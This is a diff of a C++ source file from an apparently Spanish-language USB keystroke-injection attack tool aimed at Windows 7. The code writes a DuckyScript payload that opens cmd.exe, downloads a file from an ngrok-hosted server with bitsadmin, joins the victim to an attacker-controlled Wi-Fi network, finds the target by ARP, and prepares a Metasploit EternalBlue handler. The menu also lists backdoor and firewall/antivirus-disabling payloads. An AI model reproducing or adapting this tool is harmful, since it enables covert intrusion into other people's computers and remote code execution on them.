@@ -7,6 +7,8 @@
 #include <sched.h>
 #include <string>
 #include "../include/hexConv.hpp"
+#include "../include/ngrok_return.hpp"
+#include "../include/RHOST.hpp"
 
 using namespace std;
 
@@ -15,16 +17,22 @@ int create=1;
 void generateXML(string SSID,string PASSWORD);
 void msgError();
 string hexName(string SSID);
+void startAttack2();
 int menu();
-void caseTwo(string ip);
+void caseTwo(string &ip);
 void generateRC(string LHOST, string RHOST);
-void ftpServer();
 void genHIDeternal(string SSID);
 void metasploitHandler();
+void setHid();
+void convertToSH();
+void resetHID();
+void startServers();
+string rhost_Return();
 
 
 string altern;
 string name_file;
+string SSID;
 int main(int argc, char *argv[]){
     string arguments[7];
     bool manker=true;
@@ -67,11 +75,17 @@ int main(int argc, char *argv[]){
                                 case 2:
                                     // Generar xml exportable - eternalblue
 
+                                    
                                     caseTwo(LHOST);
-                                    ftpServer();
 
-
-
+                                    startServers();
+                                    setHid();
+                                    convertToSH();
+                                    system("sleep 5");
+                                    startAttack2();
+                                    //metasploitHandler();
+                                    //
+                                    generateRC(rhost_Return(), LHOST);
                                     metasploitHandler();
                                     cout<<" [1.] Disfrute del dia 0"<<endl;
                                     break;
@@ -185,40 +199,37 @@ string hexName(string SSID){
 int menu(){
     int seleccion;
     cout<<" [!] Que tipo de PAYLOAD HID decea generar (windows 7)"<<endl;
-    cout<<"                                                 •────────────────────────────────────────────────────────────────•"<<endl;
-    cout<<"                                                 | [1] HID - Descargar WGET y Generar puerta trasera              |"<<endl;
-    cout<<"                                                 | [2] HID - Descargar y Exportar HOSTPOT - exploit eternalblue   |"<<endl;
-    cout<<"                                                 | [3] HID - Desabilitar Firewall - Antiviruz                     |"<<endl;
-    cout<<"                                                 •────────────────────────────────────────────────────────────────•"<<endl;
+    cout<<"         •────────────────────────────────────────────────────────────────•"<<endl;
+    cout<<"         | [1] HID - Descargar WGET y Generar puerta trasera              |"<<endl;
+    cout<<"         | [2] HID - Descargar y Exportar HOSTPOT - exploit eternalblue   |"<<endl;
+    cout<<"         | [3] HID - Desabilitar Firewall - Antiviruz                     |"<<endl;
+    cout<<"         •────────────────────────────────────────────────────────────────•"<<endl;
     cout<<endl;
     cout<<" [+] Digite su exploit : ";cin>>seleccion;
 
     return seleccion;
 }
 
-void caseTwo(string ip){
-    string SSID;
+void caseTwo(string &ip){
     string PASSWORD;
-    string RHOST;
     cin.ignore();
     cout<<" [!] Digite el SSID de la red       : "; 
     getline(cin,SSID);
     cout<<" [!] Digite la contraseña de la red : ";
     getline(cin, PASSWORD);
-    cout<<" [!] Digite el RHOST o Objetivo      : ";
-    getline(cin,RHOST);
-    system("rm *");
-    generateRC(RHOST,ip);
+    system("rm -rf ../lib/*");
     generateXML(SSID, PASSWORD);
-    genHIDeternal(SSID);
+    //genHIDeternal(SSID);
 
 }
-void ftpServer(){
-    system("python3 ../ftpserver/ftpserver.py  > /dev/null 2>&1 &");
+void startServers(){
+    system("bash ../server/ngrok/server.sh");
+    genHIDeternal(SSID);
 }
 void genHIDeternal(string SSID){
+    string link=ngrok_return();
     ofstream hid;
-    hid.open("../lib/SourceDucky/exploit-eternal.sh", ios::out);
+    hid.open("../tmp/SourceDucky/exploit-eternal.ducky", ios::out);
     if (hid.fail()) {
         cout<<" [1]. Error usted no tiene permisos en este directorio..."<<endl;
         exit(1);
@@ -229,17 +240,39 @@ void genHIDeternal(string SSID){
     hid<<"STRING cmd.exe"<<endl;
     hid<<"ENTER"<<endl;
     hid<<"DELAY 100"<<endl;
-    hid<<"STRING echo open 192.168.43.1 2121 >> ftp &echo user root root123 >> ftp &echo binary >> ftp &echo get "<<name_file<<" >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp"<<endl;
+    hid<<"STRING bitsadmin /transfer debjob /download /priority normal "<<link<<"/"<<name_file<<" %APPDATA%\\"<<name_file<<endl;
     hid<<"ENTER"<<endl;
-    hid<<"DELAY 1000"<<endl;
-    hid<<"STRING netsh wlan add profile filename=\""<<name_file<<"\""<<endl;
+    hid<<"DELAY 5000"<<endl;
+    hid<<"STRING netsh wlan add profile filename=%APPDATA%\\"<<name_file<<endl;
     hid<<"ENTER"<<endl;
     hid<<"DELAY 100"<<endl;
-    hid<<"netsh wlan connect name="<<SSID<<endl;
+    hid<<"STRING netsh wlan connect name="<<SSID<<endl;
     hid<<"ENTER"<<endl;
-    hid<<"STRING exit"<<endl;
+    //hid<<"STRING exit"<<endl;
     hid<<"ENTER"<<endl;
+    hid.close();
 }
 void metasploitHandler(){
-    system("xterm -class Foo -name foo -u8 -fa 'Terminus' -132 -T Imprimiendo -geometry 41x37+0+0 -e msfconsole -qr ../lib/eternal.rc &");
+    system("vncserver :1 -geometry 550x950 > /dev/null 2>&1");
+}
+void setHid(){
+    system("usbarmory -t win -f hid -v '0x18d1' -p '0x4a4a' > /dev/null 2>&1");
+}
+void resetHID(){
+     system("usbarmory -t win -f reset -v '0x18d1' -p '0x4ee7' > /dev/null 2>&1");
+}
+void convertToSH(){
+    system("duckyconverter -i ../tmp/SourceDucky/exploit-eternal.ducky -o ../tmp/SourceDucky/exploit-eternal.sh -l es");
+}
+void startAttack2(){
+    system("su -c \"sh ../tmp/SourceDucky/exploit-eternal.sh\"");
+}
+string rhost_Return(){
+    string rhost;
+    system("rm ../wind7-eternal/tabla.arp > /dev/null 2>&1");
+    initArp();
+    system("sleep 1");
+    rhost=coulRHOST(1);
+    cout<<rhost<<endl;
+    return rhost;
 }
